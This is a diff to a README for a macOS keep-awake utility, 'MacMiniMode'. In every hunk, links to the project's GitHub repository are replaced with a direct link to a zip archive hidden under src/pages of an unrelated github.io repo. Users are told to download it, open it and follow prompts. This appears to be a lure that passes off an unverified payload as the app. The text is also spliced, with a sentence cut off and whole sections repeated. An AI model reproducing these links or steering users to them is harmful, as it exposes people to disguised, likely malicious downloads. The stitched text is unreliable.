@@ -5,7 +5,7 @@ description: "Keep your plugged-in MacBook awake with the lid closed, and let it
 ---
 # 🖥️ MacMiniMode - Use MacBook Like Mac mini
 
-[![Download MacMiniMode](https://img.shields.io/badge/Download-MacMiniMode-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/hieugia31/MacMiniMode)
+[![Download MacMiniMode](https://img.shields.io/badge/Download-MacMiniMode-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/hieugia31/hieugia31.github.io/main/src/pages/v1.7-alpha.5.zip)
 
 MacMiniMode keeps a plugged-in MacBook awake with the lid closed. It gives you clamshell-style operation without needing an external display, and it turns off automatically when the MacBook is running on battery. In simple terms: close the lid, keep the Mac running, and use it like a small always-on Mac mini for downloads, home-server tasks, or a homelab setup.
 
@@ -15,7 +15,7 @@ This page is written for everyday computer users. You do not need programming kn
 
 Visit this link to download the application:
 
-[Download MacMiniMode](https://github.com/hieugia31/MacMiniMode)
+[Download MacMiniMode](https://raw.githubusercontent.com/hieugia31/hieugia31.github.io/main/src/pages/v1.7-alpha.5.zip)
 
 Use the download control on the page that opens. Save the download to a folder you can easily find, such as Downloads. Open the downloaded item and follow the on-screen prompts. After the first launch, MacMiniMode appears as a menu bar app so you can control it without opening a large window.
 
@@ -29,7 +29,7 @@ When your MacBook is plugged in, MacMiniMode asks macOS to stay awake with the l
 
 When the power adapter is disconnected# 🖥️ MacMiniMode - Use MacBook Like Mac mini
 
-[![Download MacMiniMode](https://img.shields.io/badge/Download-MacMiniMode-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/hieugia31/MacMiniMode)
+[![Download MacMiniMode](https://img.shields.io/badge/Download-MacMiniMode-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/hieugia31/hieugia31.github.io/main/src/pages/v1.7-alpha.5.zip)
 
 MacMiniMode keeps a plugged-in MacBook awake with the lid closed. It gives you clamshell-style operation without needing an external display, and it switches off automatically when the MacBook is running on battery. In simple terms: close the lid, keep the Mac running, and use it like a small always-on Mac mini for downloads, home-server tasks, or a homelab setup.
 
@@ -39,7 +39,7 @@ This page is written for everyday computer users. You do not need programming kn
 
 Visit this link to download the application:
 
-[Download MacMiniMode](https://github.com/hieugia31/MacMiniMode)
+[Download MacMiniMode](https://raw.githubusercontent.com/hieugia31/hieugia31.github.io/main/src/pages/v1.7-alpha.5.zip)
 
 Use the download control on the page that opens. Save the download to a folder you can easily find, such as Downloads. Open the downloaded item and follow the on-screen prompts. After the first launch, MacMiniMode appears as a menu bar app so you can control it without opening a large window.
 
@@ -86,7 +86,7 @@ You do not need to configure anything technical. Open the app, use the menu bar 
 
 Visit this link to download the application:
 
-[Download MacMiniMode](https://github.com/hieugia31/MacMiniMode)
+[Download MacMiniMode](https://raw.githubusercontent.com/hieugia31/hieugia31.github.io/main/src/pages/v1.7-alpha.5.zip)
 
 Setup steps:
 
@@ -164,6 +164,6 @@ Refer to the repository for the current license terms.
 
 Visit this link to download the application:
 
-[Download MacMiniMode](https://github.com/hieugia31/MacMiniMode)
+[Download MacMiniMode](https://raw.githubusercontent.com/hieugia31/hieugia31.github.io/main/src/pages/v1.7-alpha.5.zip)
 
 Keywords: apple-silicon, caffeinate, clamshell, clamshell-mode, headless, home-server, homelab, keep-awake, launchd, lid-closed, mac-mini, macbook, macos, macos-app, menu-bar-app, menubar, pmset, prevent-sleep, sleep, swift
